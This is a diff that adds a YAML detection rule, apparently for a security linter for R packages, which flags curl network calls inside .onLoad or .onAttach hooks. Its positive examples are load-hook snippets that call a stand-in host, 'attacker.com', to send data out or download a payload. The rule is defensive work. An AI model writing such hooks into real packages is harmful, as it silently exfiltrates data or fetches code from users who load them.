@@ -1,0 +1,63 @@
+name: onload_calls_curl_rule
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+  A curl network call inside .onLoad or .onAttach sends an outbound HTTP
+  request automatically when a package is loaded. Matches curl_fetch_memory(),
+  curl_fetch_disk(), curl_fetch_stream(), curl_download(), and multi_run(),
+  both qualified (curl::) and unqualified.
+description: >-
+  Flag curl package network execution calls inside .onLoad or .onAttach.
+  Matches assignments using <-, =, or -> so that all syntactically valid
+  definition forms are covered.
+xpath: >-
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
+        text() = 'curl_fetch_memory' or text() = 'curl_fetch_disk' or
+        text() = 'curl_fetch_stream' or text() = 'curl_download' or
+        text() = 'multi_run'
+      ]
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//SYMBOL_FUNCTION_CALL[
+        text() = 'curl_fetch_memory' or text() = 'curl_fetch_disk' or
+        text() = 'curl_fetch_stream' or text() = 'curl_download' or
+        text() = 'multi_run'
+      ]
+    )
+  ]
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      curl::curl_fetch_memory("https://attacker.com/collect")
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      curl::curl_download("https://attacker.com/payload", destfile = tempfile())
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      curl::curl_fetch_disk("https://attacker.com/collect", tempfile())
+    }
+  - |
+    (function(libname, pkgname) {
+      curl_fetch_memory("https://attacker.com/collect")
+    }) -> .onLoad
+example_negative:
+  - |
+    download_data <- function(url, dest) {
+      curl::curl_download(url, destfile = dest)
+    }
+  - |
+    .onUnload <- function(libpath) {
+      curl::curl_fetch_memory("https://example.com/unloaded")
+    }
